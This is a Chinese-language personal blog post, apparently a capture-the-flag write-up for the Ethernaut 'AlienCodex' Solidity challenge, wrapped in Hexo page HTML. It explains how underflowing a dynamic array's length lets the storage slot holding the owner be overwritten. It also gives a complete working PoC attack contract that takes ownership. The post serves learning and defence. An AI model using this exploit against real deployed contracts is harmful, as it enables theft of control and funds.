@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/icons8-autumn-material-filled-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/icons8-autumn-material-filled-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="AlienCodeX源码： 12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &amp;#x27;..&#x2F;helpers&#x2F;Ownable-05.sol&amp;#x27;;contract AlienCodex is Ownable &amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AlienCodex-wp">
+<meta property="og:url" content="http://example.com/2024/01/16/AlienCodex-wp/index.html">
+<meta property="og:site_name" content="Q1ngying">
+<meta property="og:description" content="AlienCodeX源码： 12345678910111213141516171819202122232425262728293031&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &amp;#x27;..&#x2F;helpers&#x2F;Ownable-05.sol&amp;#x27;;contract AlienCodex is Ownable &amp;#1">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-01-16T12:47:27.000Z">
+<meta property="article:modified_time" content="2024-01-16T12:48:50.323Z">
+<meta property="article:author" content="Q1ngying">
+<meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="Security">
+<meta property="article:tag" content="Ethernaut">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2024/01/16/AlienCodex-wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>AlienCodex-wp | Q1ngying</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Q1ngying</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">清影的个人站</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/16/AlienCodex-wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Q1ngying">
+      <meta itemprop="description" content="今朝梦醒与君别，遥盼春风寄相思">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Q1ngying">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AlienCodex-wp
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-01-16 20:47:27 / 修改时间：20:48:50" itemprop="dateCreated datePublished" datetime="2024-01-16T20:47:27+08:00">2024-01-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Ethernaut/" itemprop="url" rel="index"><span itemprop="name">Ethernaut</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeup/" itemprop="url" rel="index"><span itemprop="name">writeup</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>902</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="AlienCodeX"><a href="#AlienCodeX" class="headerlink" title="AlienCodeX"></a>AlienCodeX</h1><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../helpers/Ownable-05.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AlienCodex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">contacted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">assert</span>(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">makeContact</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex.<span class="title function_">push</span>(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) contacted public &#123;</span><br><span class="line">    codex.<span class="property">length</span>--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先分析源码，发现合约版本 5.0（对于合约版本 &lt; 8.0 的需要留意上下溢出）</p>
+<p>刚开始做的时候，不知道<strong>继承合约会把原合约中的状态变量一块继承</strong>，也算是找到了一个盲点。</p>
+<p>在 EVM 中，变量存储都是存在<strong>插槽（slot）</strong>中的，一共有 2**256 个正好对应 sha256。所以<strong>slot0存储的是父合约（Ownable）中的地址类型变量</strong>（推断出来的，因为这道题的目标是成为 Owner）。</p>
+<p>而想要成为 Owner，在这个合约是没有函数的，但是，存在函数<code>retract()</code>，该函数可以减少<code>bytes32[] codex</code>的长度（在 Solidity 0.8 版本之前，动态数组没有内置 pop 方法来删除最后一个变量，只能通过<code>array.length--</code>的方式）这里就出现了问题：<strong>Solidity &lt; 0.8 版本存在溢出问题，可以利用该函数，使得动态数组下溢，因为 EVM 只有 <code>2 ** 256</code>个插槽，下溢后，动态数组覆盖了所有的插槽，这样就可以直接覆盖 slot0 修改 Owner 为我们自己</strong>。</p>
+<p>还有一点就是关于：<strong>动态数组的实际存储位置（之前的博客文章——Yul内联汇编入门里有写）</strong>然后在我尝试攻击的时候，忽略了几个点：</p>
+<ul>
+<li><p><code>keccak256(abi.encode(uint256(&quot;实际插槽位置&quot;)))</code>，<del>我使用的是<code>abi.encodePacked</code>紧密打包方式，这里错了</del>。</p>
+</li>
+<li><p>进制转换的问题：</p>
+<ul>
+<li><del>我最开始的转换方式为：<code>bytes32(bytes20(uint160(msg.sender)))</code></del></li>
+<li>而实际上的转换方式为：<code>bytes32(uint256(uint160(msg.sender)))</code></li>
+</ul>
+<p>一眼看上去没什么区别，但是这涉及到了显示转换补码的方式（之前的博客文章——solidity类型转换相关有写）：</p>
+<ul>
+<li><p><code>uint</code>这一类（包括<code>int</code>）显示转换的时，举例：</p>
+<ul>
+<li><p><strong>高位转低位：保留低位</strong></p>
+<p><code>uint32 --&gt; uint16: 0x12345678 --&gt; 0x5678</code></p>
+</li>
+<li><p><strong>低位转高位：前补零</strong><br><code>uint16 --&gt; uint32: 0x5678 --&gt; 0x00005678</code></p>
+</li>
+</ul>
+</li>
+<li><p><code>bytes</code>类：</p>
+<ul>
+<li>高位转地位：保留高位<br><code>bytes2 --&gt; bytes1: 0x1234 --&gt; 0x12</code></li>
+<li>低<strong>位转高位：后补零</strong><br><code>bytes1 --&gt; bytes2: 0x12 --&gt; 0x1200</code></li>
+</ul>
+</li>
+</ul>
+<p>所以现在不难发现我的问题了：</p>
+<ul>
+<li>我得到的：<code>0xaddress000...</code></li>
+<li>实际上的：<code>0x000...address</code></li>
+</ul>
+</li>
+</ul>
+<p>完整的 PoC：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IAlienCodex</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contacted</span>(<span class="params"></span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">makeContact</span>(<span class="params"></span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>)  external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>)  external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>)  external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">owner</span>(<span class="params"></span>) external <span class="title function_">returns</span>(address);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Hack</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address target</span>) &#123;</span><br><span class="line">        <span class="title class_">IAlienCodex</span>(target).<span class="title function_">makeContact</span>();</span><br><span class="line">        <span class="title class_">IAlienCodex</span>(target).<span class="title function_">retract</span>();</span><br><span class="line">        uint256 slot;</span><br><span class="line">        slot = <span class="title function_">uint256</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="title function_">uint256</span>(<span class="number">1</span>))));</span><br><span class="line">        uint256 i = <span class="number">0</span>;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            i -= slot;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title class_">IAlienCodex</span>(target).<span class="title function_">revise</span>(i,<span class="title function_">bytes32</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>))));</span><br><span class="line">        <span class="built_in">require</span>(<span class="title class_">IAlienCodex</span>(target).<span class="title function_">owner</span>() == <span class="title function_">address</span>(msg.<span class="property">sender</span>), <span class="string">&quot;hack failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>补充：由于源码中涉及到了修饰符<code>contacted</code>绕过这个需要调用一次函数<code>makeContact</code>。</p>
+<p>关于 slot0 对应的字节数组序号，这就涉及到数学计算了：我们通过<code>slot = uint256(keccak256(abi.encode(uint256(1))))</code><strong>得到了动态数组中第一个元素的实际存储位置</strong>，数组中一共有<code>2 ** 256</code>个变量，第一个是变量<code>slot</code>对应的位置，而 0 对应的数组序号，一样利用下溢计算即可，即<code>0 - slot</code>。由于我们 PoC 的合约版本 &gt; 0.8 所以利用下溢时，<strong>需要使用<code>unchecked</code>代码块，取消内置的溢出检测</strong>。</p>
+<p>还有一个可以优化的点，在构造函数中，我传入的类型为<code>address</code>地址类型，但实际上，可以直接传递<code>IAlienCodex</code>这个接口类型，后续的书写会简单很多，直接<code>target.函数名</code>即可，<del>而我现在的就比较麻烦<code>IAlienCodex(target).函数名</code></del></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Q1ngying
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2024/01/16/AlienCodex-wp/" title="AlienCodex-wp">http://example.com/2024/01/16/AlienCodex-wp/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Solidity/" rel="tag"># Solidity</a>
+              <a href="/tags/Security/" rel="tag"># Security</a>
+              <a href="/tags/Ethernaut/" rel="tag"># Ethernaut</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/11/%E9%80%9A%E7%94%A8%E5%8D%87%E7%BA%A7%E5%90%88%E7%BA%A6%EF%BC%88UUPS%EF%BC%89/" rel="prev" title="通用升级合约（UUPS）">
+      <i class="fa fa-chevron-left"></i> 通用升级合约（UUPS）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AlienCodeX"><span class="nav-number">1.</span> <span class="nav-text">AlienCodeX</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Q1ngying"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Q1ngying</p>
+  <div class="site-description" itemprop="description">今朝梦醒与君别，遥盼春风寄相思</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">44</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/q1ngying" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;q1ngying" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:q1ngying@163.com" title="E-Mail → mailto:q1ngying@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2023-09 – 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Q1ngying</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">124k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6:54</span>
+</div>
+
+<div class="powered-by">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <i class="fa fa-user-md"></i>
+    <span id="busuanzi_container_site_uv">
+        本站访客数:<span id="busuanzi_value_site_uv"></span>人
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站访问量<span id="busuanzi_value_site_pv"></span>人次
+    </span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='255,255,255' opacity='1' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
